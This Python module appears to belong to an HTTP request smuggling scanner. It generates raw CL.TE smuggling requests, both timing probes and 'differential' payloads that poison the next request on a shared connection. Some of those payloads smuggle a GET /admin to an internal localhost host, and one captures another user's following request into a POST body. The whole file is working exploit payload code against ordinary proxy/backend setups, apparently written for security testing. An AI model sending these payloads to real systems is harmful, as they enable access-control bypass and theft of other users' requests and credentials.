"""CL.TE (Content-Length vs Transfer-Encoding) payload generator.

In CL.TE smuggling:
- Frontend uses Content-Length to determine request boundary
- Backend uses Transfer-Encoding: chunked

The attacker sends a request where:
- Content-Length includes extra data
- Backend processes the chunked body and leaves leftover data
- Leftover data becomes prefix of next request
"""

from typing import List
from urllib.parse import urlparse

from http_smuggler.core.models import (
    Endpoint,
    SmugglingVariant,
    DetectionMethod,
)
from http_smuggler.payloads.generator import (
    Payload,
    PayloadGenerator,
    PayloadCategory,
)


class CLTEPayloadGenerator(PayloadGenerator):
    """Generator for CL.TE smuggling payloads."""
    
    @property
    def variant(self) -> SmugglingVariant:
        return SmugglingVariant.CL_TE
    
    @property
    def name(self) -> str:
        return "CL.TE Payload Generator"
    
    def _extract_host_path(self, endpoint: Endpoint) -> tuple:
        """Extract host and path from endpoint."""
        parsed = urlparse(endpoint.url)
        host = parsed.hostname or ""
        if parsed.port and parsed.port not in (80, 443):
            host = f"{host}:{parsed.port}"
        path = parsed.path or "/"
        if parsed.query:
            path = f"{path}?{parsed.query}"
        return host, path
    
    def generate_timing_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate CL.TE timing-based detection payloads.
        
        These payloads cause a timeout if the backend uses Transfer-Encoding
        because the chunked body is incomplete.
        """
        host, path = self._extract_host_path(endpoint)
        payloads = []
        
        # Basic CL.TE timing payload
        # Frontend sees CL=4, sends "1\r\nZ"
        # Backend expects chunked, reads chunk size "1", data "Z", then waits for more
        payload1 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"1"  # Valid hex digit - incomplete chunk causes backend to wait
        )
        
        payloads.append(Payload(
            name="CL.TE-timing-basic",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=payload1.encode(),
            description="Basic CL.TE timing payload with incomplete chunk",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Backend waits for chunk terminator, causing timeout",
            expected_timeout=5.0,
        ))
        
        # CL.TE timing with larger Content-Length mismatch
        payload2 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"  # Extra byte after terminator
        )
        
        payloads.append(Payload(
            name="CL.TE-timing-extra",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=payload2.encode(),
            description="CL.TE with extra byte after chunk terminator",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Extra data after terminator confuses backend",
            expected_timeout=5.0,
        ))
        
        # CL.TE with minimal Content-Length
        payload3 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: 3\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"A"  # Incomplete - missing \r\n after data
        )
        
        payloads.append(Payload(
            name="CL.TE-timing-minimal",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=payload3.encode(),
            description="Minimal CL.TE timing with CL=3",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Backend waits for chunk data terminator",
            expected_timeout=5.0,
        ))
        
        # CL.TE with large chunk size declaration
        payload4 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: 5\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"ff\r\n"  # Declares 255 bytes but only sends 1
            f"1"  # Valid hex digit instead of X
        )
        
        payloads.append(Payload(
            name="CL.TE-timing-large-chunk",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=payload4.encode(),
            description="CL.TE with large chunk size declaration",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Backend expects 255 bytes, waits indefinitely",
            expected_timeout=10.0,
        ))
        
        return payloads
    
    def generate_differential_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate CL.TE differential detection payloads.
        
        These payloads poison the next request if vulnerable, causing
        a detectably different response.
        """
        host, path = self._extract_host_path(endpoint)
        payloads = []
        
        # Smuggle a GET /404 request that poisons next response
        smuggled_request = "GET /404_smuggled HTTP/1.1\r\nX-Ignore: X"
        # Calculate content length for front-end:
        # "0\r\n\r\n" (5 bytes) + smuggled request
        body = f"0\r\n\r\n{smuggled_request}"
        content_length = len(body)
        
        payload1 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body}"
        )
        
        payloads.append(Payload(
            name="CL.TE-differential-404",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=payload1.encode(),
            description="CL.TE smuggle GET /404_smuggled to poison next request",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next request receives 404 or error response",
            poison_prefix="GET /404_smuggled",
        ))
        
        # Smuggle with GPOST method prefix
        # This causes "GPOST" method error when combined with next "POST /"
        smuggled = "G"
        body2 = f"0\r\n\r\n{smuggled}"
        cl2 = len(body2)
        
        payload2 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: {cl2}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body2}"
        )
        
        payloads.append(Payload(
            name="CL.TE-differential-gpost",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=payload2.encode(),
            description="CL.TE smuggle 'G' to create GPOST method",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next POST becomes GPOST - unrecognized method",
            poison_prefix="G",
        ))
        
        # Smuggle request to different host (internal)
        internal_host = "localhost"
        smuggled3 = f"GET /admin HTTP/1.1\r\nHost: {internal_host}\r\n\r\n"
        body3 = f"0\r\n\r\n{smuggled3}"
        cl3 = len(body3)
        
        payload3 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: {cl3}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body3}"
        )
        
        payloads.append(Payload(
            name="CL.TE-differential-internal",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=payload3.encode(),
            description="CL.TE smuggle request to internal host",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next request sees /admin response",
            poison_prefix="GET /admin",
        ))
        
        # Smuggle with different method (PUT instead of GET)
        smuggled4 = f"PUT / HTTP/1.1\r\nHost: {host}\r\nX-Foo: "
        body4 = f"0\r\n\r\n{smuggled4}"
        cl4 = len(body4)
        
        payload4 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: {cl4}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body4}"
        )
        
        payloads.append(Payload(
            name="CL.TE-differential-put",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=payload4.encode(),
            description="CL.TE smuggle PUT request",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next request becomes PUT",
            poison_prefix="PUT /",
        ))
        
        # Smuggle with X- header capture
        smuggled5 = f"POST /capture HTTP/1.1\r\nHost: {host}\r\nContent-Length: 500\r\n\r\ndata="
        body5 = f"0\r\n\r\n{smuggled5}"
        cl5 = len(body5)
        
        payload5 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: {cl5}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body5}"
        )
        
        payloads.append(Payload(
            name="CL.TE-differential-capture",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=payload5.encode(),
            description="CL.TE smuggle request that captures next request",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next request is captured in body",
            poison_prefix="POST /capture",
            metadata={"capture_length": 500},
        ))
        
        return payloads

